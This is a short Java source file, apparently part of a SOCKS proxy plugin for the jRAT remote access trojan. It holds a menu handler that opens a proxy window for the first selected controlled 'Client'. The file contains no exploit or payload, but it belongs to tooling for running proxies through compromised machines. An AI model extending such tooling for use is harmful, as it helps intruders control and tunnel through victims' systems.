package se.jrat.plugin.socks.client;

import java.util.List;

import jrat.api.Client;
import jrat.api.ui.RATMenuItemActionListener;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<Client> servers) {
		try {
			if (servers.size() > 0) {
				final Client server = servers.get(0);		
				new FrameSocks(server).setVisible(true);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
